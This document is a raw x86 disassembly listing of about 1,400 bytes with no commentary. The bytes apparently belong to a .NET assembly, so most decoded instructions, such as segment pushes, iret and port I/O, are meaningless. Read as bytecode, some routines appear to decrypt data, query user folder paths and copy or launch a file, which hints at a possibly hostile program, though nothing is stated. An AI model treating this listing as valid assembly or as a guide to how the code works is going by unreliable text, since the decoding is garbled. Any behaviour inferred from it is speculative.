  4025ae:	20 00                	and    %al,(%eax)
  4025b0:	00 0a                	add    %cl,(%edx)
  4025b2:	2a 00                	sub    (%eax),%al
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	00 00                	add    %al,(%eax)
  4025b8:	01 02                	add    %eax,(%edx)
  4025ba:	03 04 05 06 07 08 1b 	add    0x1b080706(,%eax,1),%eax
  4025c1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4025c4:	c6 00 00             	movb   $0x0,(%eax)
  4025c7:	00 0a                	add    %cl,(%edx)
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  4025ce:	1e                   	push   %ds
  4025cf:	8d 19                	lea    (%ecx),%ebx
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	01 25 d0 22 00 00    	add    %esp,0x22d0
  4025d9:	04 28                	add    $0x28,%al
  4025db:	37                   	aaa
  4025dc:	00 00                	add    %al,(%eax)
  4025de:	0a 0b                	or     (%ebx),%cl
  4025e0:	73 38                	jae    0x40261a
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  4025e7:	39 00                	cmp    %eax,(%eax)
  4025e9:	00 0a                	add    %cl,(%edx)
  4025eb:	0d 09 20 00 01       	or     $0x1002009,%eax
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f3:	3a 00                	cmp    (%eax),%al
  4025f5:	00 0a                	add    %cl,(%edx)
  4025f7:	09 20                	or     %esp,(%eax)
  4025f9:	80 00 00             	addb   $0x0,(%eax)
  4025fc:	00 6f 3b             	add    %ch,0x3b(%edi)
  4025ff:	00 00                	add    %al,(%eax)
  402601:	0a 03                	or     (%ebx),%al
  402603:	07                   	pop    %es
  402604:	20 e8                	and    %ch,%al
  402606:	03 00                	add    (%eax),%eax
  402608:	00 73 3c             	add    %dh,0x3c(%ebx)
  40260b:	00 00                	add    %al,(%eax)
  40260d:	0a 13                	or     (%ebx),%dl
  40260f:	04 09                	add    $0x9,%al
  402611:	11 04 09             	adc    %eax,(%ecx,%ecx,1)
  402614:	6f                   	outsl  %ds:(%esi),(%dx)
  402615:	3d 00 00 0a 1e       	cmp    $0x1e0a0000,%eax
  40261a:	5b                   	pop    %ebx
  40261b:	6f                   	outsl  %ds:(%esi),(%dx)
  40261c:	3e 00 00             	add    %al,%ds:(%eax)
  40261f:	0a 6f 3f             	or     0x3f(%edi),%ch
  402622:	00 00                	add    %al,(%eax)
  402624:	0a 09                	or     (%ecx),%cl
  402626:	11 04 09             	adc    %eax,(%ecx,%ecx,1)
  402629:	6f                   	outsl  %ds:(%esi),(%dx)
  40262a:	40                   	inc    %eax
  40262b:	00 00                	add    %al,(%eax)
  40262d:	0a 1e                	or     (%esi),%bl
  40262f:	5b                   	pop    %ebx
  402630:	6f                   	outsl  %ds:(%esi),(%dx)
  402631:	3e 00 00             	add    %al,%ds:(%eax)
  402634:	0a 6f 41             	or     0x41(%edi),%ch
  402637:	00 00                	add    %al,(%eax)
  402639:	0a 09                	or     (%ecx),%cl
  40263b:	17                   	pop    %ss
  40263c:	6f                   	outsl  %ds:(%esi),(%dx)
  40263d:	42                   	inc    %edx
  40263e:	00 00                	add    %al,(%eax)
  402640:	0a 08                	or     (%eax),%cl
  402642:	09 6f 43             	or     %ebp,0x43(%edi)
  402645:	00 00                	add    %al,(%eax)
  402647:	0a 17                	or     (%edi),%dl
  402649:	73 44                	jae    0x40268f
  40264b:	00 00                	add    %al,(%eax)
  40264d:	0a 13                	or     (%ebx),%dl
  40264f:	05 11 05 02 16       	add    $0x16020511,%eax
  402654:	02 8e 69 6f 45 00    	add    0x456f69(%esi),%cl
  40265a:	00 0a                	add    %cl,(%edx)
  40265c:	11 05 6f 46 00 00    	adc    %eax,0x466f
  402662:	0a de                	or     %dh,%bl
  402664:	0c 11                	or     $0x11,%al
  402666:	05 2c 07 11 05       	add    $0x511072c,%eax
  40266b:	6f                   	outsl  %ds:(%esi),(%dx)
  40266c:	47                   	inc    %edi
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a dc                	or     %ah,%bl
  402671:	08 6f 48             	or     %ch,0x48(%edi)
  402674:	00 00                	add    %al,(%eax)
  402676:	0a 0a                	or     (%edx),%cl
  402678:	de 0a                	fimuls (%edx)
  40267a:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  40267d:	09 6f 47             	or     %ebp,0x47(%edi)
  402680:	00 00                	add    %al,(%eax)
  402682:	0a dc                	or     %ah,%bl
  402684:	de 0a                	fimuls (%edx)
  402686:	08 2c 06             	or     %ch,(%esi,%eax,1)
  402689:	08 6f 47             	or     %ch,0x47(%edi)
  40268c:	00 00                	add    %al,(%eax)
  40268e:	0a dc                	or     %ah,%bl
  402690:	06                   	push   %es
  402691:	2a 00                	sub    (%eax),%al
  402693:	00 01                	add    %al,(%ecx)
  402695:	28 00                	sub    %al,(%eax)
  402697:	00 02                	add    %al,(%edx)
  402699:	00 84 00 15 99 00 0c 	add    %al,0xc009915(%eax,%eax,1)
  4026a0:	00 00                	add    %al,(%eax)
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	02 00                	add    (%eax),%al
  4026a6:	20 00                	and    %al,(%eax)
  4026a8:	8e ae 00 0a 00 00    	mov    0xa00(%esi),%gs
  4026ae:	00 00                	add    %al,(%eax)
  4026b0:	02 00                	add    (%eax),%al
  4026b2:	1a 00                	sbb    (%eax),%al
  4026b4:	a0 ba 00 0a 00       	mov    0xa00ba,%al
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	00 13                	add    %dl,(%ebx)
  4026bd:	30 05 00 61 00 00    	xor    %al,0x6100
  4026c3:	00 0b                	add    %cl,(%ebx)
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	11 02                	adc    %eax,(%edx)
  4026c9:	28 49 00             	sub    %cl,0x0(%ecx)
  4026cc:	00 0a                	add    %cl,(%edx)
  4026ce:	0a 1f                	or     (%edi),%bl
  4026d0:	14 28                	adc    $0x28,%al
  4026d2:	0d 00 00 06 0b       	or     $0xb060000,%eax
  4026d7:	28 21                	sub    %ah,(%ecx)
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	0a 07                	or     (%edi),%al
  4026dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4026de:	22 00                	and    (%eax),%al
  4026e0:	00 0a                	add    %cl,(%edx)
  4026e2:	0c 06                	or     $0x6,%al
  4026e4:	08 28                	or     %ch,(%eax)
  4026e6:	0e                   	push   %cs
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	06                   	push   %es
  4026ea:	0d 02 72 1c 01       	or     $0x11c7202,%eax
  4026ef:	00 70 07             	add    %dh,0x7(%eax)
  4026f2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4026f5:	00 06                	add    %al,(%esi)
  4026f7:	28 10                	sub    %dl,(%eax)
  4026f9:	00 00                	add    %al,(%eax)
  4026fb:	06                   	push   %es
  4026fc:	72 1c                	jb     0x40271a
  4026fe:	01 00                	add    %eax,(%eax)
  402700:	70 09                	jo     0x40270b
  402702:	28 23                	sub    %ah,(%ebx)
  402704:	00 00                	add    %al,(%eax)
  402706:	0a 28                	or     (%eax),%ch
  402708:	4a                   	dec    %edx
  402709:	00 00                	add    %al,(%eax)
  40270b:	0a 28                	or     (%eax),%ch
  40270d:	30 00                	xor    %al,(%eax)
  40270f:	00 0a                	add    %cl,(%edx)
  402711:	02 02                	add    (%edx),%al
  402713:	72 87                	jb     0x40269c
  402715:	00 00                	add    %al,(%eax)
  402717:	70 1a                	jo     0x402733
  402719:	28 08                	sub    %cl,(%eax)
  40271b:	00 00                	add    %al,(%eax)
  40271d:	06                   	push   %es
  40271e:	28 31                	sub    %dh,(%ecx)
  402720:	00 00                	add    %al,(%eax)
  402722:	0a 28                	or     (%eax),%ch
  402724:	32 00                	xor    (%eax),%al
  402726:	00 0a                	add    %cl,(%edx)
  402728:	2a 00                	sub    (%eax),%al
  40272a:	00 00                	add    %al,(%eax)
  40272c:	1b 30                	sbb    (%eax),%esi
  40272e:	03 00                	add    (%eax),%eax
  402730:	4d                   	dec    %ebp
  402731:	00 00                	add    %al,(%eax)
  402733:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402736:	00 11                	add    %dl,(%ecx)
  402738:	28 21                	sub    %ah,(%ecx)
  40273a:	00 00                	add    %al,(%eax)
  40273c:	0a 02                	or     (%edx),%al
  40273e:	6f                   	outsl  %ds:(%esi),(%dx)
  40273f:	22 00                	and    (%eax),%al
  402741:	00 0a                	add    %cl,(%edx)
  402743:	0a 20                	or     (%eax),%ah
  402745:	00 04 00             	add    %al,(%eax,%eax,1)
  402748:	00 73 4b             	add    %dh,0x4b(%ebx)
  40274b:	00 00                	add    %al,(%eax)
  40274d:	0a 0b                	or     (%ebx),%cl
  40274f:	07                   	pop    %es
  402750:	03 6f 20             	add    0x20(%edi),%ebp
  402753:	00 00                	add    %al,(%eax)
  402755:	0a 6f 4c             	or     0x4c(%edi),%ch
  402758:	00 00                	add    %al,(%eax)
  40275a:	0a 07                	or     (%edi),%al
  40275c:	06                   	push   %es
  40275d:	17                   	pop    %ss
  40275e:	6f                   	outsl  %ds:(%esi),(%dx)
  40275f:	4d                   	dec    %ebp
  402760:	00 00                	add    %al,(%eax)
  402762:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402765:	28 23                	sub    %ah,(%ebx)
  402767:	00 00                	add    %al,(%eax)
  402769:	0a 0d 09 13 04 de    	or     0xde041309,%cl
  40276f:	12 07                	adc    (%edi),%al
  402771:	16                   	push   %ss
  402772:	6f                   	outsl  %ds:(%esi),(%dx)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	0a dc                	or     %ah,%bl
  402778:	07                   	pop    %es
  402779:	2c 06                	sub    $0x6,%al
  40277b:	07                   	pop    %es
  40277c:	6f                   	outsl  %ds:(%esi),(%dx)
  40277d:	47                   	inc    %edi
  40277e:	00 00                	add    %al,(%eax)
  402780:	0a dc                	or     %ah,%bl
  402782:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  402785:	00 00                	add    %al,(%eax)
  402787:	00 01                	add    %al,(%ecx)
  402789:	1c 00                	sbb    $0x0,%al
  40278b:	00 02                	add    %al,(%edx)
  40278d:	00 17                	add    %dl,(%edi)
  40278f:	00 21                	add    %ah,(%ecx)
  402791:	38 00                	cmp    %al,(%eax)
  402793:	08 00                	or     %al,(%eax)
  402795:	00 00                	add    %al,(%eax)
  402797:	00 02                	add    %al,(%edx)
  402799:	00 17                	add    %dl,(%edi)
  40279b:	00 29                	add    %ch,(%ecx)
  40279d:	40                   	inc    %eax
  40279e:	00 0a                	add    %cl,(%edx)
  4027a0:	00 00                	add    %al,(%eax)
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	13 30                	adc    (%eax),%esi
  4027a6:	03 00                	add    (%eax),%eax
  4027a8:	f9                   	stc
  4027a9:	01 00                	add    %eax,(%eax)
  4027ab:	00 0d 00 00 11 28    	add    %cl,0x28110000
  4027b1:	4f                   	dec    %edi
  4027b2:	00 00                	add    %al,(%eax)
  4027b4:	0a 13                	or     (%ebx),%dl
  4027b6:	0e                   	push   %cs
  4027b7:	16                   	push   %ss
  4027b8:	13 0f                	adc    (%edi),%ecx
  4027ba:	2b 29                	sub    (%ecx),%ebp
  4027bc:	11 0e                	adc    %ecx,(%esi)
  4027be:	11 0f                	adc    %ecx,(%edi)
  4027c0:	9a 0a 06 6f 20 00 00 	lcall  $0x0,$0x206f060a
  4027c7:	0a 72 3a             	or     0x3a(%edx),%dh
  4027ca:	01 00                	add    %eax,(%eax)
  4027cc:	70 28                	jo     0x4027f6
  4027ce:	0f 00 00             	sldt   (%eax)
  4027d1:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4027d4:	06                   	push   %es
  4027d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d6:	20 00                	and    %al,(%eax)
  4027d8:	00 0a                	add    %cl,(%edx)
  4027da:	28 0b                	sub    %cl,(%ebx)
  4027dc:	00 00                	add    %al,(%eax)
  4027de:	06                   	push   %es
  4027df:	11 0f                	adc    %ecx,(%edi)
  4027e1:	17                   	pop    %ss
  4027e2:	58                   	pop    %eax
  4027e3:	13 0f                	adc    (%edi),%ecx
  4027e5:	11 0f                	adc    %ecx,(%edi)
  4027e7:	11 0e                	adc    %ecx,(%esi)
  4027e9:	8e 69 32             	mov    0x32(%ecx),%gs
  4027ec:	cf                   	iret
  4027ed:	7e 02                	jle    0x4027f1
  4027ef:	00 00                	add    %al,(%eax)
  4027f1:	04 7e                	add    $0x7e,%al
  4027f3:	01 00                	add    %eax,(%eax)
  4027f5:	00 04 72             	add    %al,(%edx,%esi,2)
  4027f8:	42                   	inc    %edx
  4027f9:	01 00                	add    %eax,(%eax)
  4027fb:	70 28                	jo     0x402825
  4027fd:	31 00                	xor    %eax,(%eax)
  4027ff:	00 0a                	add    %cl,(%edx)
  402801:	0b 7e 02             	or     0x2(%esi),%edi
  402804:	00 00                	add    %al,(%eax)
  402806:	04 7e                	add    $0x7e,%al
  402808:	01 00                	add    %eax,(%eax)
  40280a:	00 04 72             	add    %al,(%edx,%esi,2)
  40280d:	54                   	push   %esp
  40280e:	01 00                	add    %eax,(%eax)
  402810:	70 28                	jo     0x40283a
  402812:	31 00                	xor    %eax,(%eax)
  402814:	00 0a                	add    %cl,(%edx)
  402816:	0c 7e                	or     $0x7e,%al
  402818:	02 00                	add    (%eax),%al
  40281a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40281d:	01 00                	add    %eax,(%eax)
  40281f:	00 04 72             	add    %al,(%edx,%esi,2)
  402822:	62 01                	bound  %eax,(%ecx)
  402824:	00 70 28             	add    %dh,0x28(%eax)
  402827:	31 00                	xor    %eax,(%eax)
  402829:	00 0a                	add    %cl,(%edx)
  40282b:	0d 7e 02 00 00       	or     $0x27e,%eax
  402830:	04 7e                	add    $0x7e,%al
  402832:	01 00                	add    %eax,(%eax)
  402834:	00 04 72             	add    %al,(%edx,%esi,2)
  402837:	42                   	inc    %edx
  402838:	01 00                	add    %eax,(%eax)
  40283a:	70 28                	jo     0x402864
  40283c:	31 00                	xor    %eax,(%eax)
  40283e:	00 0a                	add    %cl,(%edx)
  402840:	13 04 7e             	adc    (%esi,%edi,2),%eax
  402843:	02 00                	add    (%eax),%al
  402845:	00 04 7e             	add    %al,(%esi,%edi,2)
  402848:	01 00                	add    %eax,(%eax)
  40284a:	00 04 72             	add    %al,(%edx,%esi,2)
  40284d:	76 01                	jbe    0x402850
  40284f:	00 70 28             	add    %dh,0x28(%eax)
  402852:	31 00                	xor    %eax,(%eax)
  402854:	00 0a                	add    %cl,(%edx)
  402856:	13 05 7e 02 00 00    	adc    0x27e,%eax
  40285c:	04 7e                	add    $0x7e,%al
  40285e:	01 00                	add    %eax,(%eax)
  402860:	00 04 72             	add    %al,(%edx,%esi,2)
  402863:	8c 01                	mov    %es,(%ecx)
  402865:	00 70 28             	add    %dh,0x28(%eax)
  402868:	31 00                	xor    %eax,(%eax)
  40286a:	00 0a                	add    %cl,(%edx)
  40286c:	13 06                	adc    (%esi),%eax
  40286e:	7e 02                	jle    0x402872
  402870:	00 00                	add    %al,(%eax)
  402872:	04 7e                	add    $0x7e,%al
  402874:	01 00                	add    %eax,(%eax)
  402876:	00 04 72             	add    %al,(%edx,%esi,2)
  402879:	a2 01 00 70 28       	mov    %al,0x28700001
  40287e:	31 00                	xor    %eax,(%eax)
  402880:	00 0a                	add    %cl,(%edx)
  402882:	13 07                	adc    (%edi),%eax
  402884:	7e 02                	jle    0x402888
  402886:	00 00                	add    %al,(%eax)
  402888:	04 7e                	add    $0x7e,%al
  40288a:	01 00                	add    %eax,(%eax)
  40288c:	00 04 72             	add    %al,(%edx,%esi,2)
  40288f:	b6 01                	mov    $0x1,%dh
  402891:	00 70 28             	add    %dh,0x28(%eax)
  402894:	31 00                	xor    %eax,(%eax)
  402896:	00 0a                	add    %cl,(%edx)
  402898:	13 08                	adc    (%eax),%ecx
  40289a:	7e 02                	jle    0x40289e
  40289c:	00 00                	add    %al,(%eax)
  40289e:	04 7e                	add    $0x7e,%al
  4028a0:	01 00                	add    %eax,(%eax)
  4028a2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028a5:	c4 01                	les    (%ecx),%eax
  4028a7:	00 70 28             	add    %dh,0x28(%eax)
  4028aa:	31 00                	xor    %eax,(%eax)
  4028ac:	00 0a                	add    %cl,(%edx)
  4028ae:	13 09                	adc    (%ecx),%ecx
  4028b0:	7e 02                	jle    0x4028b4
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	04 7e                	add    $0x7e,%al
  4028b6:	01 00                	add    %eax,(%eax)
  4028b8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028bb:	d8 01                	fadds  (%ecx)
  4028bd:	00 70 28             	add    %dh,0x28(%eax)
  4028c0:	31 00                	xor    %eax,(%eax)
  4028c2:	00 0a                	add    %cl,(%edx)
  4028c4:	13 0a                	adc    (%edx),%ecx
  4028c6:	7e 02                	jle    0x4028ca
  4028c8:	00 00                	add    %al,(%eax)
  4028ca:	04 7e                	add    $0x7e,%al
  4028cc:	01 00                	add    %eax,(%eax)
  4028ce:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d1:	f2 01 00             	repnz add %eax,(%eax)
  4028d4:	70 28                	jo     0x4028fe
  4028d6:	31 00                	xor    %eax,(%eax)
  4028d8:	00 0a                	add    %cl,(%edx)
  4028da:	13 0b                	adc    (%ebx),%ecx
  4028dc:	7e 02                	jle    0x4028e0
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	04 7e                	add    $0x7e,%al
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e7:	08 02                	or     %al,(%edx)
  4028e9:	00 70 28             	add    %dh,0x28(%eax)
  4028ec:	31 00                	xor    %eax,(%eax)
  4028ee:	00 0a                	add    %cl,(%edx)
  4028f0:	13 0c 7e             	adc    (%esi,%edi,2),%ecx
  4028f3:	02 00                	add    (%eax),%al
  4028f5:	00 04 7e             	add    %al,(%esi,%edi,2)
  4028f8:	01 00                	add    %eax,(%eax)
  4028fa:	00 04 72             	add    %al,(%edx,%esi,2)
  4028fd:	1c 02                	sbb    $0x2,%al
  4028ff:	00 70 28             	add    %dh,0x28(%eax)
  402902:	31 00                	xor    %eax,(%eax)
  402904:	00 0a                	add    %cl,(%edx)
  402906:	13 0d 07 28 0b 00    	adc    0xb2807,%ecx
  40290c:	00 06                	add    %al,(%esi)
  40290e:	08 28                	or     %ch,(%eax)
  402910:	0b 00                	or     (%eax),%eax
  402912:	00 06                	add    %al,(%esi)
  402914:	09 28                	or     %ebp,(%eax)
  402916:	0b 00                	or     (%eax),%eax
  402918:	00 06                	add    %al,(%esi)
  40291a:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40291d:	0b 00                	or     (%eax),%eax
  40291f:	00 06                	add    %al,(%esi)
  402921:	11 05 28 0b 00 00    	adc    %eax,0xb28
  402927:	06                   	push   %es
  402928:	11 06                	adc    %eax,(%esi)
  40292a:	28 0b                	sub    %cl,(%ebx)
  40292c:	00 00                	add    %al,(%eax)
  40292e:	06                   	push   %es
  40292f:	11 07                	adc    %eax,(%edi)
  402931:	28 0b                	sub    %cl,(%ebx)
  402933:	00 00                	add    %al,(%eax)
  402935:	06                   	push   %es
  402936:	11 08                	adc    %ecx,(%eax)
  402938:	28 0b                	sub    %cl,(%ebx)
  40293a:	00 00                	add    %al,(%eax)
  40293c:	06                   	push   %es
  40293d:	11 09                	adc    %ecx,(%ecx)
  40293f:	28 0b                	sub    %cl,(%ebx)
  402941:	00 00                	add    %al,(%eax)
  402943:	06                   	push   %es
  402944:	11 0a                	adc    %ecx,(%edx)
  402946:	28 0b                	sub    %cl,(%ebx)
  402948:	00 00                	add    %al,(%eax)
  40294a:	06                   	push   %es
  40294b:	11 0b                	adc    %ecx,(%ebx)
  40294d:	28 0b                	sub    %cl,(%ebx)
  40294f:	00 00                	add    %al,(%eax)
  402951:	06                   	push   %es
  402952:	11 0c 28             	adc    %ecx,(%eax,%ebp,1)
  402955:	0b 00                	or     (%eax),%eax
  402957:	00 06                	add    %al,(%esi)
  402959:	11 0d 28 0b 00 00    	adc    %ecx,0xb28
  40295f:	06                   	push   %es
  402960:	1f                   	pop    %ds
  402961:	1a 28                	sbb    (%eax),%ch
  402963:	0e                   	push   %cs
  402964:	00 00                	add    %al,(%eax)
  402966:	0a 28                	or     (%eax),%ch
  402968:	0b 00                	or     (%eax),%eax
  40296a:	00 06                	add    %al,(%esi)
  40296c:	1f                   	pop    %ds
  40296d:	2e 28 0e             	sub    %cl,%cs:(%esi)
  402970:	00 00                	add    %al,(%eax)
  402972:	0a 28                	or     (%eax),%ch
  402974:	0b 00                	or     (%eax),%eax
  402976:	00 06                	add    %al,(%esi)
  402978:	1f                   	pop    %ds
  402979:	36 28 0e             	sub    %cl,%ss:(%esi)
  40297c:	00 00                	add    %al,(%eax)
  40297e:	0a 28                	or     (%eax),%ch
  402980:	0b 00                	or     (%eax),%eax
  402982:	00 06                	add    %al,(%esi)
  402984:	1f                   	pop    %ds
  402985:	35 28 0e 00 00       	xor    $0xe28,%eax
  40298a:	0a 28                	or     (%eax),%ch
  40298c:	0b 00                	or     (%eax),%eax
  40298e:	00 06                	add    %al,(%esi)
  402990:	1f                   	pop    %ds
  402991:	37                   	aaa
  402992:	28 0e                	sub    %cl,(%esi)
  402994:	00 00                	add    %al,(%eax)
  402996:	0a 28                	or     (%eax),%ch
  402998:	0b 00                	or     (%eax),%eax
  40299a:	00 06                	add    %al,(%esi)
  40299c:	1f                   	pop    %ds
  40299d:	19 28                	sbb    %ebp,(%eax)
  40299f:	0e                   	push   %cs
  4029a0:	00 00                	add    %al,(%eax)
  4029a2:	0a 28                	or     (%eax),%ch
  4029a4:	0b 00                	or     (%eax),%eax
  4029a6:	00 06                	add    %al,(%esi)
  4029a8:	2a 00                	sub    (%eax),%al
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	1b 30                	sbb    (%eax),%esi
  4029ae:	03 00                	add    (%eax),%eax
  4029b0:	ec                   	in     (%dx),%al
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	00 0e                	add    %cl,(%esi)
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	11 02                	adc    %eax,(%edx)
  4029b9:	0a 28                	or     (%eax),%ch
  4029bb:	50                   	push   %eax
  4029bc:	00 00                	add    %al,(%eax)
  4029be:	0a 6f 51             	or     0x51(%edi),%ch
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	0a 0b                	or     (%ebx),%cl
  4029c5:	28 16                	sub    %dl,(%esi)
  4029c7:	00 00                	add    %al,(%eax)
  4029c9:	0a 6f 0c             	or     0xc(%edi),%ch
  4029cc:	00 00                	add    %al,(%eax)
  4029ce:	0a 0c 1d 28 0e 00 00 	or     0xe28(,%ebx,1),%cl
  4029d5:	0a 72 2c             	or     0x2c(%edx),%dh
  4029d8:	02 00                	add    (%eax),%al
  4029da:	70 07                	jo     0x4029e3
  4029dc:	28 31                	sub    %dh,(%ecx)
  4029de:	00 00                	add    %al,(%eax)
  4029e0:	0a 26                	or     (%esi),%ah
  4029e2:	1f                   	pop    %ds
  4029e3:	1a 28                	sbb    (%eax),%ch
  4029e5:	0e                   	push   %cs
  4029e6:	00 00                	add    %al,(%eax)
  4029e8:	0a 72 2c             	or     0x2c(%edx),%dh
  4029eb:	02 00                	add    (%eax),%al
  4029ed:	70 28                	jo     0x402a17
  4029ef:	52                   	push   %edx
  4029f0:	00 00                	add    %al,(%eax)
  4029f2:	0a 0d 09 06 28 52    	or     0x52280609,%cl
  4029f8:	00 00                	add    %al,(%eax)
  4029fa:	0a 13                	or     (%ebx),%dl
  4029fc:	04 07                	add    $0x7,%al
  4029fe:	06                   	push   %es
  4029ff:	28 0f                	sub    %cl,(%edi)
  402a01:	00 00                	add    %al,(%eax)
  402a03:	0a 2d 0d 08 11 04    	or     0x411080d,%ch
  402a09:	28 0f                	sub    %cl,(%edi)
  402a0b:	00 00                	add    %al,(%eax)
  402a0d:	0a 39                	or     (%ecx),%bh
  402a0f:	90                   	nop
  402a10:	00 00                	add    %al,(%eax)
  402a12:	00 11                	add    %dl,(%ecx)
  402a14:	04 28                	add    $0x28,%al
  402a16:	53                   	push   %ebx
  402a17:	00 00                	add    %al,(%eax)
  402a19:	0a 2d 39 07 11 04    	or     0x4110739,%ch
  402a1f:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402a23:	0a 11                	or     (%ecx),%dl
  402a25:	04 73                	add    $0x73,%al
  402a27:	55                   	push   %ebp
  402a28:	00 00                	add    %al,(%eax)
  402a2a:	0a 13                	or     (%ebx),%dl
  402a2c:	05 11 05 09 6f       	add    $0x6f090511,%eax
  402a31:	56                   	push   %esi
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 73 57             	or     0x57(%ebx),%dh
  402a37:	00 00                	add    %al,(%eax)
  402a39:	0a 13                	or     (%ebx),%dl
  402a3b:	06                   	push   %es
  402a3c:	11 06                	adc    %eax,(%esi)
  402a3e:	11 05 6f 58 00 00    	adc    %eax,0x586f
  402a44:	0a 11                	or     (%ecx),%dl
  402a46:	06                   	push   %es
  402a47:	6f                   	outsl  %ds:(%esi),(%dx)
  402a48:	59                   	pop    %ecx
  402a49:	00 00                	add    %al,(%eax)
  402a4b:	0a 2c 55 17 28 06 00 	or     0x62817(,%edx,2),%ch
  402a52:	00 0a                	add    %cl,(%edx)
  402a54:	2a 11                	sub    (%ecx),%dl
  402a56:	04 28                	add    $0x28,%al
  402a58:	5a                   	pop    %edx
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	0a 20                	or     (%eax),%ah
  402a5d:	c8 00 00 00          	enter  $0x0,$0x0
  402a61:	28 10                	sub    %dl,(%eax)
  402a63:	00 00                	add    %al,(%eax)
  402a65:	0a 07                	or     (%edi),%al
  402a67:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402a6a:	54                   	push   %esp
  402a6b:	00 00                	add    %al,(%eax)
  402a6d:	0a de                	or     %dh,%bl
  402a6f:	03 26                	add    (%esi),%esp
  402a71:	de 00                	fiadds (%eax)
  402a73:	11 04 73             	adc    %eax,(%ebx,%esi,2)
  402a76:	55                   	push   %ebp
  402a77:	00 00                	add    %al,(%eax)
  402a79:	0a 13                	or     (%ebx),%dl
  402a7b:	07                   	pop    %es
  402a7c:	11 07                	adc    %eax,(%edi)
  402a7e:	09 6f 56             	or     %ebp,0x56(%edi)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	0a 73 57             	or     0x57(%ebx),%dh
  402a86:	00 00                	add    %al,(%eax)
  402a88:	0a 13                	or     (%ebx),%dl
  402a8a:	08 11                	or     %dl,(%ecx)
  402a8c:	08 11                	or     %dl,(%ecx)
  402a8e:	07                   	pop    %es
  402a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  402a90:	58                   	pop    %eax
  402a91:	00 00                	add    %al,(%eax)
  402a93:	0a 11                	or     (%ecx),%dl
  402a95:	08 6f 59             	or     %ch,0x59(%edi)
  402a98:	00 00                	add    %al,(%eax)
  402a9a:	0a 2c 06             	or     (%esi,%eax,1),%ch
  402a9d:	17                   	pop    %ss
  402a9e:	28 06                	sub    %al,(%esi)
  402aa0:	00 00                	add    %al,(%eax)
  402aa2:	0a 2a                	or     (%edx),%ch
  402aa4:	01 10                	add    %edx,(%eax)
  402aa6:	00 00                	add    %al,(%eax)
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	9d                   	popf
  402aab:	00 1b                	add    %bl,(%ebx)
  402aad:	b8 00 03 01 00       	mov    $0x10300,%eax
  402ab2:	00 01                	add    %al,(%ecx)
  402ab4:	1b 30                	sbb    (%eax),%esi
  402ab6:	03 00                	add    (%eax),%eax
  402ab8:	19 01                	sbb    %eax,(%ecx)
  402aba:	00 00                	add    %al,(%eax)
  402abc:	0f 00 00             	sldt   (%eax)
  402abf:	11 02                	adc    %eax,(%edx)
  402ac1:	0a 28                	or     (%eax),%ch
  402ac3:	50                   	push   %eax
  402ac4:	00 00                	add    %al,(%eax)
  402ac6:	0a 6f 51             	or     0x51(%edi),%ch
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	0a 0b                	or     (%ebx),%cl
  402acd:	28 16                	sub    %dl,(%esi)
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	0a 6f 0c             	or     0xc(%edi),%ch
  402ad4:	00 00                	add    %al,(%eax)
  402ad6:	0a 0c 1d 28 0e 00 00 	or     0xe28(,%ebx,1),%cl
  402add:	0a 72 2c             	or     0x2c(%edx),%dh
  402ae0:	02 00                	add    (%eax),%al
  402ae2:	70 07                	jo     0x402aeb
  402ae4:	28 31                	sub    %dh,(%ecx)
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 26                	or     (%esi),%ah
  402aea:	1f                   	pop    %ds
  402aeb:	1a 28                	sbb    (%eax),%ch
  402aed:	0e                   	push   %cs
  402aee:	00 00                	add    %al,(%eax)
  402af0:	0a 72 2c             	or     0x2c(%edx),%dh
  402af3:	02 00                	add    (%eax),%al
  402af5:	70 28                	jo     0x402b1f
  402af7:	52                   	push   %edx
  402af8:	00 00                	add    %al,(%eax)
  402afa:	0a 0d 09 06 28 52    	or     0x52280609,%cl
  402b00:	00 00                	add    %al,(%eax)
  402b02:	0a 13                	or     (%ebx),%dl
  402b04:	04 11                	add    $0x11,%al
  402b06:	04 73                	add    $0x73,%al
  402b08:	55                   	push   %ebp
